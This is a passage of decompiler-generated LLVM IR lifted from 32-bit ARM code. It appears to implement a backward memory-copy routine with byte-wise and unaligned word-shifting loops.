  store i1 %v7_18ef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ef4, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_18efc = add i32 %v0_18ef4, 2
  %v3_18efc = sub i32 -3, %v0_18ef4
  %v4_18efc = and i32 %v3_18efc, %v1_18ef4
  %v5_18efc = icmp slt i32 %v4_18efc, 0
  store i1 %v5_18efc, i1* %cpsr_v.global-to-local, align 1
  %v6_18efc = icmp slt i32 %v1_18efc, 0
  store i1 %v6_18efc, i1* %cpsr_n.global-to-local, align 1
  %v7_18efc = icmp eq i32 %v1_18ef4, 2
  store i1 %v7_18efc, i1* %cpsr_z.global-to-local, align 1
  %v0_18f00 = load i32, i32* %r1.global-to-local, align 4
  %v1_18f00 = add i32 %v0_18f00, -1
  %v2_18f00 = inttoptr i32 %v1_18f00 to i8*
  %v3_18f00 = load i8, i8* %v2_18f00, align 1
  %v4_18f00 = zext i8 %v3_18f00 to i32
  store i32 %v4_18f00, i32* @r3, align 4
  store i32 %v1_18f00, i32* %r1.global-to-local, align 4
  %v3_18f04 = add i32 %v2_18ef8, -1
  %v4_18f04 = inttoptr i32 %v3_18f04 to i8*
  store i8 %v3_18f00, i8* %v4_18f04, align 1
  %v5_18f04 = load i32, i32* %r0.global-to-local, align 4
  %v6_18f04 = add i32 %v5_18f04, -1
  store i32 %v6_18f04, i32* %r0.global-to-local, align 4
  %v0_18f08 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18f08 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18f08 = xor i1 %v0_18f08, %v1_18f08
  br i1 %v2_18f08, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_18f08 = load i32, i32* %r1.global-to-local, align 4
  %v4_18f08 = add i32 %v3_18f08, -1
  %v5_18f08 = inttoptr i32 %v4_18f08 to i8*
  %v6_18f08 = load i8, i8* %v5_18f08, align 1
  %v7_18f08 = zext i8 %v6_18f08 to i32
  store i32 %v7_18f08, i32* @r3, align 4
  store i32 %v4_18f08, i32* %r1.global-to-local, align 4
  %v6_18f0c = add i32 %v5_18f04, -2
  %v7_18f0c = inttoptr i32 %v6_18f0c to i8*
  store i8 %v6_18f08, i8* %v7_18f0c, align 1
  %v8_18f0c = load i32, i32* %r0.global-to-local, align 4
  %v9_18f0c = add i32 %v8_18f0c, -1
  store i32 %v9_18f0c, i32* %r0.global-to-local, align 4
  %v1_18f10.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18f10.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_18f14 = phi i32 [ %v9_18f0c, %bb152 ], [ %v6_18f04, %bb151 ]
  %v2_18f14 = phi i1 [ %v2_18f10.pre, %bb152 ], [ %v1_18f08, %bb151 ]
  %v1_18f14 = phi i1 [ %v1_18f10.pre, %bb152 ], [ %v0_18f08, %bb151 ]
  %v0_18f10 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18f10 = xor i1 %v2_18f14, %v1_18f14
  %v4_18f10 = or i1 %v0_18f10, %v3_18f10
  br i1 %v4_18f10, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_18f10 = load i32, i32* %r1.global-to-local, align 4
  %v6_18f10 = add i32 %v5_18f10, -1
  %v7_18f10 = inttoptr i32 %v6_18f10 to i8*
  %v8_18f10 = load i8, i8* %v7_18f10, align 1
  %v9_18f10 = zext i8 %v8_18f10 to i32
  store i32 %v9_18f10, i32* @r3, align 4
  store i32 %v6_18f10, i32* %r1.global-to-local, align 4
  %v8_18f14 = add i32 %v7_18f14, -1
  %v9_18f14 = inttoptr i32 %v8_18f14 to i8*
  store i8 %v8_18f10, i8* %v9_18f14, align 1
  %v10_18f14 = load i32, i32* %r0.global-to-local, align 4
  %v11_18f14 = add i32 %v10_18f14, -1
  store i32 %v11_18f14, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_18f1c:                               ; preds = %dec_label_pc_18e74
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_18f1c = icmp eq i32 %v1_18e74, 1
  store i1 %v8_18f1c, i1* %cpsr_n.global-to-local, align 1
  %v9_18f1c = icmp eq i32 %v1_18e74, 2
  store i1 %v9_18f1c, i1* %cpsr_z.global-to-local, align 1
  %v1_18f20 = add i32 %v2_18e64, -1
  %v2_18f20 = inttoptr i32 %v1_18f20 to i8*
  %v3_18f20 = load i8, i8* %v2_18f20, align 1
  %v4_18f20 = zext i8 %v3_18f20 to i32
  store i32 %v4_18f20, i32* @r3, align 4
  store i32 %v1_18f20, i32* %r1.global-to-local, align 4
  %v3_18f24 = add i32 %v2_18e68, -1
  %v4_18f24 = inttoptr i32 %v3_18f24 to i8*
  store i8 %v3_18f20, i8* %v4_18f24, align 1
  %v5_18f24 = load i32, i32* %r0.global-to-local, align 4
  %v6_18f24 = add i32 %v5_18f24, -1
  store i32 %v6_18f24, i32* %r0.global-to-local, align 4
  br i1 %v8_18f1c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_18f1c
  %v6_18f28 = load i32, i32* %r1.global-to-local, align 4
  %v7_18f28 = add i32 %v6_18f28, -1
  %v8_18f28 = inttoptr i32 %v7_18f28 to i8*
  %v9_18f28 = load i8, i8* %v8_18f28, align 1
  %v10_18f28 = zext i8 %v9_18f28 to i32
  store i32 %v10_18f28, i32* @r3, align 4
  store i32 %v7_18f28, i32* %r1.global-to-local, align 4
  %v9_18f2c = add i32 %v5_18f24, -2
  %v10_18f2c = inttoptr i32 %v9_18f2c to i8*
  store i8 %v9_18f28, i8* %v10_18f2c, align 1
  %v11_18f2c = load i32, i32* %r0.global-to-local, align 4
  %v12_18f2c = add i32 %v11_18f2c, -1
  store i32 %v12_18f2c, i32* %r0.global-to-local, align 4
  br i1 %v9_18f1c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_18f30 = load i32, i32* %r1.global-to-local, align 4
  %v9_18f30 = add i32 %v8_18f30, -1
  %v10_18f30 = inttoptr i32 %v9_18f30 to i8*
  %v11_18f30 = load i8, i8* %v10_18f30, align 1
  %v12_18f30 = zext i8 %v11_18f30 to i32
  store i32 %v12_18f30, i32* @r3, align 4
  store i32 %v9_18f30, i32* %r1.global-to-local, align 4
  %v11_18f34 = add i32 %v11_18f2c, -2
  %v12_18f34 = inttoptr i32 %v11_18f34 to i8*
  store i8 %v11_18f30, i8* %v12_18f34, align 1
  %v13_18f34 = load i32, i32* %r0.global-to-local, align 4
  %v14_18f34 = add i32 %v13_18f34, -1
  store i32 %v14_18f34, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_18f1c, %bb155
  %v0_18f9020 = phi i32 [ %v12_18f2c, %bb154 ], [ %v6_18f24, %dec_label_pc_18f1c ], [ %v14_18f34, %bb155 ]
  %v0_18f38 = load i32, i32* %r2.global-to-local, align 4
  %v1_18f38 = load i32, i32* @ip, align 4
  %v2_18f38 = sub i32 %v0_18f38, %v1_18f38
  store i32 %v2_18f38, i32* %r2.global-to-local, align 4
  %v4_18f38 = xor i32 %v1_18f38, %v0_18f38
  %v5_18f38 = xor i32 %v2_18f38, %v0_18f38
  %v6_18f38 = and i32 %v5_18f38, %v4_18f38
  %v7_18f38 = icmp slt i32 %v6_18f38, 0
  store i1 %v7_18f38, i1* %cpsr_v.global-to-local, align 1
  %v8_18f38 = icmp slt i32 %v2_18f38, 0
  store i1 %v8_18f38, i1* %cpsr_n.global-to-local, align 1
  %v9_18f38 = icmp eq i32 %v0_18f38, %v1_18f38
  store i1 %v9_18f38, i1* %cpsr_z.global-to-local, align 1
  %v5_18f3c = icmp slt i32 %v0_18f38, %v1_18f38
  br i1 %v5_18f3c, label %bb150, label %dec_label_pc_18f40

dec_label_pc_18f40:                               ; preds = %.thread14
  %v0_18f40 = load i32, i32* %r1.global-to-local, align 4
  %v1_18f40 = urem i32 %v0_18f40, 4
  store i32 %v1_18f40, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18f40 = icmp eq i32 %v1_18f40, 0
  store i1 %v2_18f40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f40, label %dec_label_pc_18e84, label %dec_label_pc_18f48

dec_label_pc_18f48:                               ; preds = %dec_label_pc_18e7c, %dec_label_pc_18f40
  %v0_18f9019 = phi i32 [ %v2_18e68, %dec_label_pc_18e7c ], [ %v0_18f9020, %dec_label_pc_18f40 ]
  %v0_1903c = phi i32 [ %v2_18e6c, %dec_label_pc_18e7c ], [ %v2_18f38, %dec_label_pc_18f40 ]
  %v0_18f48 = phi i32 [ %v2_18e64, %dec_label_pc_18e7c ], [ %v0_18f40, %dec_label_pc_18f40 ]
  %v0_18f50 = phi i32 [ %v1_18e7c, %dec_label_pc_18e7c ], [ %v1_18f40, %dec_label_pc_18f40 ]
  %v1_18f48 = and i32 %v0_18f48, -4
  store i32 %v1_18f48, i32* %r1.global-to-local, align 4
  %v1_18f4c = inttoptr i32 %v1_18f48 to i32*
  %v2_18f4c = load i32, i32* %v1_18f4c, align 4
  store i32 %v2_18f4c, i32* @r3, align 4
  %v7_18f50 = icmp ult i32 %v0_18f50, 2
  %v2_19034 = add i32 %v0_1903c, -12
  %v4_19034 = sub i32 11, %v0_1903c
  %v5_19034 = and i32 %v4_19034, %v0_1903c
  %v6_19034 = icmp slt i32 %v5_19034, 0
  store i1 %v6_19034, i1* %cpsr_v.global-to-local, align 1
  %v7_19034 = icmp slt i32 %v2_19034, 0
  store i1 %v7_19034, i1* %cpsr_n.global-to-local, align 1
  %v8_19034 = icmp eq i32 %v0_1903c, 12
  store i1 %v8_19034, i1* %cpsr_z.global-to-local, align 1
  %v5_19038 = icmp slt i32 %v0_1903c, 12
  br i1 %v7_18f50, label %dec_label_pc_19034, label %dec_label_pc_18f58

dec_label_pc_18f58:                               ; preds = %dec_label_pc_18f48
  %v8_18f50 = icmp eq i32 %v0_18f50, 2
  br i1 %v8_18f50, label %dec_label_pc_18fc8, label %dec_label_pc_18f5c

dec_label_pc_18f5c:                               ; preds = %dec_label_pc_18f58
  br i1 %v5_19038, label %dec_label_pc_18fa8, label %dec_label_pc_18f64

dec_label_pc_18f64:                               ; preds = %dec_label_pc_18f5c
  store i32 %v2_19034, i32* %r2.global-to-local, align 4
  %v3_18f68 = load i32, i32* @r4, align 4
  store i32 %v3_18f68, i32* %stack_var_-12, align 4
  %v6_18f68 = load i32, i32* @r5, align 4
  %v8_18f68 = inttoptr i32 %v6_18f68 to i8*
  store i8* %v8_18f68, i8** %stack_var_-8, align 4
  %v11_18f68 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18f6c

dec_label_pc_18f6c:                               ; preds = %dec_label_pc_18f6c.dec_label_pc_18f6c_crit_edge, %dec_label_pc_18f64
  %v0_18f90 = phi i32 [ %v1_18f90, %dec_label_pc_18f6c.dec_label_pc_18f6c_crit_edge ], [ %v0_18f9019, %dec_label_pc_18f64 ]
  %v0_18f70 = phi i32 [ %v0_18f70.pre, %dec_label_pc_18f6c.dec_label_pc_18f6c_crit_edge ], [ %v1_18f48, %dec_label_pc_18f64 ]
  %v0_18f6c = phi i32 [ %v0_18f6c.pre, %dec_label_pc_18f6c.dec_label_pc_18f6c_crit_edge ], [ %v2_18f4c, %dec_label_pc_18f64 ]
  %v3_18f6c = mul i32 %v0_18f6c, 256
  store i32 %v3_18f6c, i32* %lr.global-to-local, align 4
  %v1_18f70 = add i32 %v0_18f70, -4
  %v2_18f70 = inttoptr i32 %v1_18f70 to i32*
  %v3_18f70 = load i32, i32* %v2_18f70, align 4
  store i32 %v3_18f70, i32* @r3, align 4
  %v4_18f70 = add i32 %v0_18f70, -8
  %v5_18f70 = inttoptr i32 %v4_18f70 to i32*
  %v6_18f70 = load i32, i32* %v5_18f70, align 4
  store i32 %v6_18f70, i32* %r4.global-to-local, align 4
  %v7_18f70 = add i32 %v0_18f70, -12
  %v8_18f70 = inttoptr i32 %v7_18f70 to i32*
  %v9_18f70 = load i32, i32* %v8_18f70, align 4
  store i32 %v9_18f70, i32* %r5.global-to-local, align 4
  %v10_18f70 = add i32 %v0_18f70, -16
  %v11_18f70 = inttoptr i32 %v10_18f70 to i32*
  %v12_18f70 = load i32, i32* %v11_18f70, align 4
  store i32 %v10_18f70, i32* %r1.global-to-local, align 4
  %v4_18f74 = udiv i32 %v12_18f70, 16777216
  %v5_18f74 = or i32 %v4_18f74, %v3_18f6c
  store i32 %v5_18f74, i32* %lr.global-to-local, align 4
  %v3_18f78 = mul i32 %v12_18f70, 256
  %v4_18f7c = udiv i32 %v9_18f70, 16777216
  %v5_18f7c = or i32 %v3_18f78, %v4_18f7c
  store i32 %v5_18f7c, i32* @ip, align 4
  %v3_18f80 = mul i32 %v9_18f70, 256
  %v4_18f84 = udiv i32 %v6_18f70, 16777216
  %v5_18f84 = or i32 %v3_18f80, %v4_18f84
  store i32 %v5_18f84, i32* %r5.global-to-local, align 4
  %v3_18f88 = mul i32 %v6_18f70, 256
  %v4_18f8c = udiv i32 %v3_18f70, 16777216
  %v5_18f8c = or i32 %v3_18f88, %v4_18f8c
  store i32 %v5_18f8c, i32* %r4.global-to-local, align 4
  %v1_18f90 = add i32 %v0_18f90, -16
  %v2_18f90 = inttoptr i32 %v1_18f90 to i32*
  store i32 %v5_18f8c, i32* %v2_18f90, align 4
  %v4_18f90 = add i32 %v0_18f90, -12
  %v5_18f90 = inttoptr i32 %v4_18f90 to i32*
  %v6_18f90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18f90, i32* %v5_18f90, align 4
  %v7_18f90 = add i32 %v0_18f90, -8
  %v8_18f90 = inttoptr i32 %v7_18f90 to i32*
  %v9_18f90 = load i32, i32* @ip, align 4
  store i32 %v9_18f90, i32* %v8_18f90, align 4
  %v10_18f90 = add i32 %v0_18f90, -4
  %v11_18f90 = inttoptr i32 %v10_18f90 to i32*
  %v12_18f90 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18f90, i32* %v11_18f90, align 4
  store i32 %v1_18f90, i32* %r0.global-to-local, align 4
  %v0_18f94 = load i32, i32* %r2.global-to-local, align 4
  %v2_18f94 = add i32 %v0_18f94, -16
  store i32 %v2_18f94, i32* %r2.global-to-local, align 4
  %v6_18f98 = icmp slt i32 %v0_18f94, 16
  br i1 %v6_18f98, label %dec_label_pc_18f9c, label %dec_label_pc_18f6c.dec_label_pc_18f6c_crit_edge

dec_label_pc_18f6c.dec_label_pc_18f6c_crit_edge:  ; preds = %dec_label_pc_18f6c
  %v0_18f6c.pre = load i32, i32* @r3, align 4
  %v0_18f70.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18f6c

dec_label_pc_18f9c:                               ; preds = %dec_label_pc_18f6c
  %v2_18f9c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18f9c, i32* @r4, align 4
  %v5_18f9c = load i8*, i8** %stack_var_-8, align 4
  %v6_18f9c = ptrtoint i8* %v5_18f9c to i32
  store i32 %v6_18f9c, i32* @r5, align 4
  store i32 %v11_18f68, i32* @lr, align 4
  %v2_18fa0 = add i32 %v0_18f94, -4
  store i32 %v2_18fa0, i32* %r2.global-to-local, align 4
  %v4_18fa0 = add i32 %v0_18f94, 2147483632
  %v5_18fa0 = and i32 %v2_18fa0, %v4_18fa0
  %v6_18fa0 = icmp slt i32 %v5_18fa0, 0
  store i1 %v6_18fa0, i1* %cpsr_v.global-to-local, align 1
  %v7_18fa0 = icmp slt i32 %v2_18fa0, 0
  store i1 %v7_18fa0, i1* %cpsr_n.global-to-local, align 1
  %v8_18fa0 = icmp eq i32 %v2_18fa0, 0
  store i1 %v8_18fa0, i1* %cpsr_z.global-to-local, align 1
  %v5_18fa4 = icmp slt i32 %v2_18f94, -12
  br i1 %v5_18fa4, label %dec_label_pc_18fc0, label %dec_label_pc_18fa8

dec_label_pc_18fa8:                               ; preds = %dec_label_pc_18f9c, %dec_label_pc_18f5c, %dec_label_pc_18fa8
  %v1_18fb4 = phi i32 [ %v5_18fb4, %dec_label_pc_18fa8 ], [ %v1_18f90, %dec_label_pc_18f9c ], [ %v0_18f9019, %dec_label_pc_18f5c ]
  %v0_18fa8 = load i32, i32* @r3, align 4
  %v3_18fa8 = mul i32 %v0_18fa8, 256
  store i32 %v3_18fa8, i32* %ip.global-to-local, align 4
  %v0_18fac = load i32, i32* %r1.global-to-local, align 4
  %v1_18fac = add i32 %v0_18fac, -4
  %v2_18fac = inttoptr i32 %v1_18fac to i32*
  %v3_18fac = load i32, i32* %v2_18fac, align 4
  store i32 %v3_18fac, i32* @r3, align 4
  store i32 %v1_18fac, i32* %r1.global-to-local, align 4
  %v4_18fb0 = udiv i32 %v3_18fac, 16777216
  %v5_18fb0 = or i32 %v4_18fb0, %v3_18fa8
  store i32 %v5_18fb0, i32* @ip, align 4
  %v2_18fb4 = add i32 %v1_18fb4, -4
  %v3_18fb4 = inttoptr i32 %v2_18fb4 to i32*
  store i32 %v5_18fb0, i32* %v3_18fb4, align 4
  %v4_18fb4 = load i32, i32* %r0.global-to-local, align 4
  %v5_18fb4 = add i32 %v4_18fb4, -4
  store i32 %v5_18fb4, i32* %r0.global-to-local, align 4
  %v0_18fb8 = load i32, i32* %r2.global-to-local, align 4
  %v2_18fb8 = add i32 %v0_18fb8, -4
  store i32 %v2_18fb8, i32* %r2.global-to-local, align 4
  %v6_18fbc = icmp slt i32 %v0_18fb8, 4
  br i1 %v6_18fbc, label %dec_label_pc_18fc0.loopexit, label %dec_label_pc_18fa8

dec_label_pc_18fc0.loopexit:                      ; preds = %dec_label_pc_18fa8
  %v4_18fb8 = sub i32 3, %v0_18fb8
  %v5_18fb8 = and i32 %v4_18fb8, %v0_18fb8
  %v6_18fb8 = icmp slt i32 %v5_18fb8, 0
  %v7_18fb8 = icmp slt i32 %v2_18fb8, 0
  store i1 %v6_18fb8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18fb8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18fc0

dec_label_pc_18fc0:                               ; preds = %dec_label_pc_18fc0.loopexit, %dec_label_pc_18f9c
  %v2_18f0451 = phi i32 [ %v5_18fb4, %dec_label_pc_18fc0.loopexit ], [ %v1_18f90, %dec_label_pc_18f9c ]
  %v0_18ef447 = phi i32 [ %v2_18fb8, %dec_label_pc_18fc0.loopexit ], [ %v2_18fa0, %dec_label_pc_18f9c ]
  %v0_18fc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18fc0 = add i32 %v0_18fc0, 3
  store i32 %v1_18fc0, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_18fc8:                               ; preds = %dec_label_pc_18f58
  br i1 %v5_19038, label %dec_label_pc_19014, label %dec_label_pc_18fd0

dec_label_pc_18fd0:                               ; preds = %dec_label_pc_18fc8
  store i32 %v2_19034, i32* %r2.global-to-local, align 4
  %v3_18fd4 = load i32, i32* @r4, align 4
  store i32 %v3_18fd4, i32* %stack_var_-12, align 4
  %v6_18fd4 = load i32, i32* @r5, align 4
  %v8_18fd4 = inttoptr i32 %v6_18fd4 to i8*
  store i8* %v8_18fd4, i8** %stack_var_-8, align 4
  %v11_18fd4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18fd8

dec_label_pc_18fd8:                               ; preds = %dec_label_pc_18fd8.dec_label_pc_18fd8_crit_edge, %dec_label_pc_18fd0
  %v0_18ffc = phi i32 [ %v1_18ffc, %dec_label_pc_18fd8.dec_label_pc_18fd8_crit_edge ], [ %v0_18f9019, %dec_label_pc_18fd0 ]
  %v0_18fdc = phi i32 [ %v0_18fdc.pre, %dec_label_pc_18fd8.dec_label_pc_18fd8_crit_edge ], [ %v1_18f48, %dec_label_pc_18fd0 ]
  %v0_18fd8 = phi i32 [ %v0_18fd8.pre, %dec_label_pc_18fd8.dec_label_pc_18fd8_crit_edge ], [ %v2_18f4c, %dec_label_pc_18fd0 ]
  %v3_18fd8 = mul i32 %v0_18fd8, 65536
  store i32 %v3_18fd8, i32* %lr.global-to-local, align 4
  %v1_18fdc = add i32 %v0_18fdc, -4
  %v2_18fdc = inttoptr i32 %v1_18fdc to i32*
  %v3_18fdc = load i32, i32* %v2_18fdc, align 4
  store i32 %v3_18fdc, i32* @r3, align 4
  %v4_18fdc = add i32 %v0_18fdc, -8
  %v5_18fdc = inttoptr i32 %v4_18fdc to i32*
  %v6_18fdc = load i32, i32* %v5_18fdc, align 4
  store i32 %v6_18fdc, i32* %r4.global-to-local, align 4
  %v7_18fdc = add i32 %v0_18fdc, -12
  %v8_18fdc = inttoptr i32 %v7_18fdc to i32*
  %v9_18fdc = load i32, i32* %v8_18fdc, align 4
  store i32 %v9_18fdc, i32* %r5.global-to-local, align 4
  %v10_18fdc = add i32 %v0_18fdc, -16
  %v11_18fdc = inttoptr i32 %v10_18fdc to i32*
  %v12_18fdc = load i32, i32* %v11_18fdc, align 4
  store i32 %v10_18fdc, i32* %r1.global-to-local, align 4
  %v4_18fe0 = udiv i32 %v12_18fdc, 65536
  %v5_18fe0 = or i32 %v4_18fe0, %v3_18fd8
  store i32 %v5_18fe0, i32* %lr.global-to-local, align 4
  %v3_18fe4 = mul i32 %v12_18fdc, 65536
  %v4_18fe8 = udiv i32 %v9_18fdc, 65536
  %v5_18fe8 = or i32 %v3_18fe4, %v4_18fe8
  store i32 %v5_18fe8, i32* @ip, align 4
  %v3_18fec = mul i32 %v9_18fdc, 65536
  %v4_18ff0 = udiv i32 %v6_18fdc, 65536
  %v5_18ff0 = or i32 %v3_18fec, %v4_18ff0
  store i32 %v5_18ff0, i32* %r5.global-to-local, align 4
  %v3_18ff4 = mul i32 %v6_18fdc, 65536
  %v4_18ff8 = udiv i32 %v3_18fdc, 65536
  %v5_18ff8 = or i32 %v3_18ff4, %v4_18ff8
  store i32 %v5_18ff8, i32* %r4.global-to-local, align 4
  %v1_18ffc = add i32 %v0_18ffc, -16
  %v2_18ffc = inttoptr i32 %v1_18ffc to i32*
  store i32 %v5_18ff8, i32* %v2_18ffc, align 4
  %v4_18ffc = add i32 %v0_18ffc, -12
  %v5_18ffc = inttoptr i32 %v4_18ffc to i32*
  %v6_18ffc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18ffc, i32* %v5_18ffc, align 4
  %v7_18ffc = add i32 %v0_18ffc, -8
  %v8_18ffc = inttoptr i32 %v7_18ffc to i32*
  %v9_18ffc = load i32, i32* @ip, align 4
  store i32 %v9_18ffc, i32* %v8_18ffc, align 4
  %v10_18ffc = add i32 %v0_18ffc, -4
  %v11_18ffc = inttoptr i32 %v10_18ffc to i32*
  %v12_18ffc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18ffc, i32* %v11_18ffc, align 4
  store i32 %v1_18ffc, i32* %r0.global-to-local, align 4
  %v0_19000 = load i32, i32* %r2.global-to-local, align 4
  %v2_19000 = add i32 %v0_19000, -16
  store i32 %v2_19000, i32* %r2.global-to-local, align 4
  %v6_19004 = icmp slt i32 %v0_19000, 16
  br i1 %v6_19004, label %dec_label_pc_19008, label %dec_label_pc_18fd8.dec_label_pc_18fd8_crit_edge

dec_label_pc_18fd8.dec_label_pc_18fd8_crit_edge:  ; preds = %dec_label_pc_18fd8
  %v0_18fd8.pre = load i32, i32* @r3, align 4
  %v0_18fdc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18fd8

dec_label_pc_19008:                               ; preds = %dec_label_pc_18fd8
  %v2_19008 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19008, i32* @r4, align 4
  %v5_19008 = load i8*, i8** %stack_var_-8, align 4
  %v6_19008 = ptrtoint i8* %v5_19008 to i32
  store i32 %v6_19008, i32* @r5, align 4
  store i32 %v11_18fd4, i32* @lr, align 4
  %v2_1900c = add i32 %v0_19000, -4
  store i32 %v2_1900c, i32* %r2.global-to-local, align 4
  %v4_1900c = add i32 %v0_19000, 2147483632
  %v5_1900c = and i32 %v2_1900c, %v4_1900c
  %v6_1900c = icmp slt i32 %v5_1900c, 0
  store i1 %v6_1900c, i1* %cpsr_v.global-to-local, align 1
  %v7_1900c = icmp slt i32 %v2_1900c, 0
  store i1 %v7_1900c, i1* %cpsr_n.global-to-local, align 1
  %v8_1900c = icmp eq i32 %v2_1900c, 0
  store i1 %v8_1900c, i1* %cpsr_z.global-to-local, align 1
  %v5_19010 = icmp slt i32 %v2_19000, -12
  br i1 %v5_19010, label %dec_label_pc_1902c, label %dec_label_pc_19014

dec_label_pc_19014:                               ; preds = %dec_label_pc_19008, %dec_label_pc_18fc8, %dec_label_pc_19014
  %v1_19020 = phi i32 [ %v5_19020, %dec_label_pc_19014 ], [ %v1_18ffc, %dec_label_pc_19008 ], [ %v0_18f9019, %dec_label_pc_18fc8 ]
  %v0_19014 = load i32, i32* @r3, align 4
  %v3_19014 = mul i32 %v0_19014, 65536
  store i32 %v3_19014, i32* %ip.global-to-local, align 4
  %v0_19018 = load i32, i32* %r1.global-to-local, align 4
  %v1_19018 = add i32 %v0_19018, -4
  %v2_19018 = inttoptr i32 %v1_19018 to i32*
  %v3_19018 = load i32, i32* %v2_19018, align 4
  store i32 %v3_19018, i32* @r3, align 4
  store i32 %v1_19018, i32* %r1.global-to-local, align 4
  %v4_1901c = udiv i32 %v3_19018, 65536
  %v5_1901c = or i32 %v4_1901c, %v3_19014
  store i32 %v5_1901c, i32* @ip, align 4
  %v2_19020 = add i32 %v1_19020, -4
  %v3_19020 = inttoptr i32 %v2_19020 to i32*
  store i32 %v5_1901c, i32* %v3_19020, align 4
  %v4_19020 = load i32, i32* %r0.global-to-local, align 4
  %v5_19020 = add i32 %v4_19020, -4
  store i32 %v5_19020, i32* %r0.global-to-local, align 4
  %v0_19024 = load i32, i32* %r2.global-to-local, align 4
  %v2_19024 = add i32 %v0_19024, -4
  store i32 %v2_19024, i32* %r2.global-to-local, align 4
  %v6_19028 = icmp slt i32 %v0_19024, 4
  br i1 %v6_19028, label %dec_label_pc_1902c.loopexit, label %dec_label_pc_19014

dec_label_pc_1902c.loopexit:                      ; preds = %dec_label_pc_19014
  %v4_19024 = sub i32 3, %v0_19024
  %v5_19024 = and i32 %v4_19024, %v0_19024
  %v6_19024 = icmp slt i32 %v5_19024, 0
  %v7_19024 = icmp slt i32 %v2_19024, 0
  store i1 %v6_19024, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19024, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1902c

dec_label_pc_1902c:                               ; preds = %dec_label_pc_1902c.loopexit, %dec_label_pc_19008
  %v2_18f0452 = phi i32 [ %v5_19020, %dec_label_pc_1902c.loopexit ], [ %v1_18ffc, %dec_label_pc_19008 ]
  %v0_18ef448 = phi i32 [ %v2_19024, %dec_label_pc_1902c.loopexit ], [ %v2_1900c, %dec_label_pc_19008 ]
  %v0_1902c = load i32, i32* %r1.global-to-local, align 4
  %v1_1902c = add i32 %v0_1902c, 2
  store i32 %v1_1902c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_19034:                               ; preds = %dec_label_pc_18f48
  br i1 %v5_19038, label %dec_label_pc_19080, label %dec_label_pc_1903c

dec_label_pc_1903c:                               ; preds = %dec_label_pc_19034
  store i32 %v2_19034, i32* %r2.global-to-local, align 4
  %v3_19040 = load i32, i32* @r4, align 4
  store i32 %v3_19040, i32* %stack_var_-12, align 4
  %v6_19040 = load i32, i32* @r5, align 4
  %v8_19040 = inttoptr i32 %v6_19040 to i8*
  store i8* %v8_19040, i8** %stack_var_-8, align 4
  %v11_19040 = load i32, i32* @lr, align 4
  br label %dec_label_pc_19044

dec_label_pc_19044:                               ; preds = %dec_label_pc_19044.dec_label_pc_19044_crit_edge, %dec_label_pc_1903c
  %v0_19068 = phi i32 [ %v1_19068, %dec_label_pc_19044.dec_label_pc_19044_crit_edge ], [ %v0_18f9019, %dec_label_pc_1903c ]
  %v0_19048 = phi i32 [ %v0_19048.pre, %dec_label_pc_19044.dec_label_pc_19044_crit_edge ], [ %v1_18f48, %dec_label_pc_1903c ]
  %v0_19044 = phi i32 [ %v0_19044.pre, %dec_label_pc_19044.dec_label_pc_19044_crit_edge ], [ %v2_18f4c, %dec_label_pc_1903c ]
  %v3_19044 = mul i32 %v0_19044, 16777216
  store i32 %v3_19044, i32* %lr.global-to-local, align 4
  %v1_19048 = add i32 %v0_19048, -4
  %v2_19048 = inttoptr i32 %v1_19048 to i32*
  %v3_19048 = load i32, i32* %v2_19048, align 4
  store i32 %v3_19048, i32* @r3, align 4
  %v4_19048 = add i32 %v0_19048, -8
  %v5_19048 = inttoptr i32 %v4_19048 to i32*
  %v6_19048 = load i32, i32* %v5_19048, align 4
  store i32 %v6_19048, i32* %r4.global-to-local, align 4
  %v7_19048 = add i32 %v0_19048, -12
  %v8_19048 = inttoptr i32 %v7_19048 to i32*
  %v9_19048 = load i32, i32* %v8_19048, align 4
  store i32 %v9_19048, i32* %r5.global-to-local, align 4
  %v10_19048 = add i32 %v0_19048, -16
  %v11_19048 = inttoptr i32 %v10_19048 to i32*
  %v12_19048 = load i32, i32* %v11_19048, align 4
  store i32 %v10_19048, i32* %r1.global-to-local, align 4
  %v4_1904c = udiv i32 %v12_19048, 256
  %v5_1904c = or i32 %v4_1904c, %v3_19044
  store i32 %v5_1904c, i32* %lr.global-to-local, align 4
  %v3_19050 = mul i32 %v12_19048, 16777216
  %v4_19054 = udiv i32 %v9_19048, 256
  %v5_19054 = or i32 %v3_19050, %v4_19054
